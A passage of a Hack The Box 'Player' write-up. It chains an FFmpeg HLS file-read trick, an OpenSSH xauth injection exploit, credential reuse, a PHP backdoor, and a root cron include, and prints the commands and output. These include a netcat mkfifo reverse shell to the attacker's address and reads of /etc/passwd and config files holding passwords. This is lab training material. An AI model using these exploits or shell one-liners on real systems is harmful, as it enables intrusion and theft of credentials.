<span class="na">Cookie</span><span class="p">:</span> <span class="s">access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p>Response:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 17 Jan 2020 22:50:59 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.7 (Ubuntu)</span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.5.9-1ubuntu4.26</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">7F2dcsSdZo6nj3SNMTQ1/</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
</code></pre></div></div>

<p><br><img src="/images/hackthebox/player/14.png" alt="" class="align-center"><br><br></p>

<h2 id="ffmpeg-hls-vulnerability--arbitrary-file-read">FFmpeg HLS Vulnerability –&gt; Arbitrary File Read</h2>
<p>I uploaded a test <code class="language-plaintext highlighter-rouge">txt</code> file:
<br><img src="/images/hackthebox/player/15.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/16.png" alt="" class="align-center"><br><br>
I got an <code class="language-plaintext highlighter-rouge">avi</code> file as a result which was weird:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http:\/\/player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/518515582.avi"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p>I tried some other file formats and I also got an <code class="language-plaintext highlighter-rouge">avi</code> file.<br>
So I tried the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">ffmpeg HLS</code> exploit</a>, I created a test <code class="language-plaintext highlighter-rouge">avi</code> to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and it worked:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///etc/passwd test.avi
root@kali:~/Desktop/HTB/boxes/player/avi# file test.avi 
test.avi: RIFF (little-endian) data, AVI, 224 x 160, 25.00 fps,
root@kali:~/Desktop/HTB/boxes/player/avi#
</code></pre></div></div>

<p><br><img src="/images/hackthebox/player/17.png" alt="" class="align-center"><br><br>
I created 3 more <code class="language-plaintext highlighter-rouge">avi</code>s to read the files we got earlier from the error message from <code class="language-plaintext highlighter-rouge">staging</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/staging/contact.php contact.avi
root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/backup/service_config service_config.avi
root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/staging/fix.php fix.avi
root@kali:~/Desktop/HTB/boxes/player/avi#
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">contact.php</code> didn’t have anything interesting and the <code class="language-plaintext highlighter-rouge">avi</code> for <code class="language-plaintext highlighter-rouge">fix.php</code> was empty for some reason. In <code class="language-plaintext highlighter-rouge">service_config</code> there were some credentials for a user called <code class="language-plaintext highlighter-rouge">telegen</code>:
<br><img src="/images/hackthebox/player/18.png" alt="" class="align-center"><br><br>
I tried these credentials with <code class="language-plaintext highlighter-rouge">ssh</code> and with <code class="language-plaintext highlighter-rouge">dev.player.htb</code> and they didn’t work. I ran a quick full port scan with <code class="language-plaintext highlighter-rouge">masscan</code> and turns out that there was another open port:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# masscan -p1-65535 10.10.10.145 --rate=1000 -e tun0

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-18 00:09:24 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.10.145                                    
Discovered open port 80/tcp on 10.10.10.145                                    
Discovered open port 6686/tcp on 10.10.10.145
</code></pre></div></div>
<p>I scanned that port with <code class="language-plaintext highlighter-rouge">nmap</code> but it couldn’t identify the service:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE    VERSION
6686/tcp open  tcpwrapped
</code></pre></div></div>
<p>However when I connected to the port with <code class="language-plaintext highlighter-rouge">nc</code> the banner indicated that it was an <code class="language-plaintext highlighter-rouge">ssh</code> server:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# nc player.htb 6686
SSH-2.0-OpenSSH_7.2

Protocol mismatch.
root@kali:~/Desktop/HTB/boxes/player#
</code></pre></div></div>
<p>I could login to that <code class="language-plaintext highlighter-rouge">ssh</code> server with the credentials, but unfortunately I was in a restricted environment:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# ssh telegen@player.htb -p 6686
The authenticity of host '[player.htb]:6686 ([10.10.10.145]:6686)' can't be established.
ECDSA key fingerprint is SHA256:oAcCXvit3SHvyq7nuvWntLq+Q+mGlAg8301zhKnJmPM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[player.htb]:6686,[10.10.10.145]:6686' (ECDSA) to the list of known hosts.
telegen@player.htb's password: 
Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
Environment:
  USER=telegen
  LOGNAME=telegen
  HOME=/home/telegen
  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
  MAIL=/var/mail/telegen
  SHELL=/usr/bin/lshell
  SSH_CLIENT=10.10.xx.xx 43270 6686
  SSH_CONNECTION=10.10.xx.xx 43270 10.10.10.145 6686
  SSH_TTY=/dev/pts/4
  TERM=screen
========= PlayBuff ==========
Welcome to Staging Environment

telegen:~$ whoami
*** forbidden command: whoami
telegen:~$ help
  clear  exit  help  history  lpath  lsudo
telegen:~$ lsudo
Allowed sudo commands:
telegen:~$ lpath
Allowed:
 /home/telegen
telegen:~$ pwd
*** forbidden command: pwd
telegen:~$ 
</code></pre></div></div>

<h2 id="openssh-72p1-xauth-command-injection--user-flag">OpenSSH 7.2p1 xauth Command Injection –&gt; User Flag</h2>
<p>When I searched for exploits for that version of <code class="language-plaintext highlighter-rouge">openssh</code> I found this <a href="https://www.exploit-db.com/exploits/39569" target="_blank" rel="noopener noreferrer">exploit</a>.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# python 39569.py 
 Usage: &lt;host&gt; &lt;port&gt; &lt;username&gt; &lt;password or path_to_privkey&gt;
        
        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key
        

root@kali:~/Desktop/HTB/boxes/player# python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile &lt;path&gt;
    .writefile &lt;path&gt; &lt;data&gt;
    .exit .quit
    &lt;any xauth command or type help&gt;

#&gt; .readfile /etc/passwd
DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
telegen:x:1000:1000:telegen,,,:/home/telegen:/usr/bin/lshell
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:113:MySQL
colord:x:106:116:colord
staged-dev:x:4000000000:1001::/home/staged-dev:/bin/sh
#&gt; 
</code></pre></div></div>
<p>I tried to use <code class="language-plaintext highlighter-rouge">.writefile</code> to write a <code class="language-plaintext highlighter-rouge">php</code> file and get a reverse shell but I couldn’t do that. But anyway I was finally able to read the user flag:
<br><img src="/images/hackthebox/player/19.png" alt="" class="align-center"><br><br></p>

<h2 id="credentials-in-fixphp--rce--shell-as-www-data">Credentials in fix.php –&gt; RCE –&gt; Shell as www-data</h2>
<p>Earlier I couldn’t read <code class="language-plaintext highlighter-rouge">fix.php</code> through the <code class="language-plaintext highlighter-rouge">ffmpeg</code> exploit, I was able to read it as <code class="language-plaintext highlighter-rouge">telegen</code> and I found credentials for a user called <code class="language-plaintext highlighter-rouge">peter</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#&gt; .readfile /var/www/staging/fix.php                                    
DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'          
DEBUG:__main__:dummy exec returned: None
INFO:__main__:&lt;?php       
class                            
protected                                          
protected                                      
protected                                      
public                                       
return                                          
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
if($result
static::failed($test_name);
}
static::passed($test_name);
}
}
public
if(!$username){
$username
$password
}
//modified
//for
//fix
//peter
//CQXpm\z)G5D#%S$y=
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
echo
echo
echo
}
private
echo
static::$failed++;
}
private
static::character(".");
static::$passed++;
}
private
echo
static::$last_echoed
}
private
if(static::$last_echoed
echo
static::$last_echoed
}
}
#&gt; 
</code></pre></div></div>
<p>These credentials (<code class="language-plaintext highlighter-rouge">peter : CQXpm\z)G5D#%S$y=</code>) worked with <code class="language-plaintext highlighter-rouge">dev.player.htb</code>:
<br><img src="/images/hackthebox/player/20.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/21.png" alt="" class="align-center"><br><br></p>

<p>I tried to create a new project in <code class="language-plaintext highlighter-rouge">/var/www/html</code>:
<br><img src="/images/hackthebox/player/22.png" alt="" class="align-center"><br><br>
But I got an error saying that I was only allowed to create projects in <code class="language-plaintext highlighter-rouge">/var/www/demo/home</code> so I created a project there:
<br><img src="/images/hackthebox/player/23.png" alt="" class="align-center"><br><br>
When I ran <code class="language-plaintext highlighter-rouge">gobuster</code> on <code class="language-plaintext highlighter-rouge">http://dev.player.htb/</code> there was a directory called <code class="language-plaintext highlighter-rouge">home</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# gobuster dir -u http://dev.player.htb/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://dev.player.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/17 20:18:00 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/components (Status: 301)
/data (Status: 301)
/favicon.ico (Status: 200)
/home (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/languages (Status: 301)
/lib (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/themes (Status: 301)
===============================================================
2020/01/17 20:19:49 Finished
===============================================================
root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p>I wanted to see if that was related to <code class="language-plaintext highlighter-rouge">/var/www/demo/home</code> so I created a file called <code class="language-plaintext highlighter-rouge">test.php</code> that echoed <code class="language-plaintext highlighter-rouge">test</code> and I tried to access it through <code class="language-plaintext highlighter-rouge">/home</code>:
<br><img src="/images/hackthebox/player/24.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/25.png" alt="" class="align-center"><br><br>
It worked so I edited my test file and added the <code class="language-plaintext highlighter-rouge">php-simple-backdoor</code> code and got a reverse shell:
<br><img src="/images/hackthebox/player/26.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/27.png" alt="" class="align-center"><br><br></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.145] 56714
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@player:/var/www/demo/home$ ^Z
[1]+  Stopped                 nc -lvnp 1337
root@kali:~/Desktop/HTB/boxes/player# stty raw -echo
root@kali:~/Desktop/HTB/boxes/player# nc -lvnp 1337

www-data@player:/var/www/demo/home$ export TERM=screen
www-data@player:/var/www/demo/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@player:/var/www/demo/home$ 
</code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>
<p>when I ran <code class="language-plaintext highlighter-rouge">pspy</code> to monitor the processes I noticed that <code class="language-plaintext highlighter-rouge">/var/lib/playbuff/buff.php</code> got executed as root periodically:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2020/01/18 05:25:02 CMD: UID=0    PID=3650   | /usr/bin/php /var/lib/playbuff/buff.php 
</code></pre></div></div>
<p>I couldn’t write to it but it included another <code class="language-plaintext highlighter-rouge">php</code> file which I could write to (<code class="language-plaintext highlighter-rouge">/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code>):</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">player</span><span class="o">:/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">playbuff</span><span class="o">/</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">player</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">playbuff</span><span class="err">$</span> <span class="n">cat</span> <span class="n">buff</span><span class="mf">.</span><span class="n">php</span> 
<span class="o">&lt;?</span><span class="n">php</span>
<span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"</span><span class="p">);</span>
<span class="kd">class</span> <span class="nc">playBuff</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$logFile</span><span class="o">=</span><span class="s2">"/var/log/playbuff/logs.txt"</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$logData</span><span class="o">=</span><span class="s2">"Updated"</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s2">"/"</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logData</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$buff</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">playBuff</span><span class="p">();</span>
<span class="nv">$serialbuff</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$buff</span><span class="p">);</span>
<span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/merge.log"</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span>
<span class="p">{</span>
        <span class="nv">$update</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/logs.txt"</span><span class="p">);</span>
        <span class="nv">$query</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"update stats set status='</span><span class="nv">$update</span><span class="s2">' where id=1"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'Update Success with serialized logs!'</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/merge.log"</span><span class="p">,</span><span class="s2">"no issues yet"</span><span class="p">);</span>
        <span class="nv">$update</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/logs.txt"</span><span class="p">);</span>
        <span class="nv">$query</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"update stats set status='</span><span class="nv">$update</span><span class="s2">' where id=1"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'Update Success!'</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
www-data@player:/var/lib/playbuff$ 
</code></pre></div></div>
<p>I put my reverse shell payload in <code class="language-plaintext highlighter-rouge">/tmp</code> and added a line to <code class="language-plaintext highlighter-rouge">/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code> that executed it:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@player:/$ cat /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
&lt;?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "integrity";

system("bash -c /tmp/pwned.sh");

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
?&gt;
www-data@player:/$ cat /tmp/pwned.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1338 &gt;/tmp/f
www-data@player:/$ 
</code></pre></div></div>

<p><br><img src="/images/hackthebox/player/28.png" alt="" class="align-center"><br><br>
And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/ai/">Hack The Box - AI</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-01-18T07:00:00+02:00">January 18, 2020</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/bitlab/" class="pagination--pager" title="Hack The Box - Bitlab
">Previous</a>
    
    
      <a href="/hack-the-box/ai/" class="pagination--pager" title="Hack The Box - AI
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
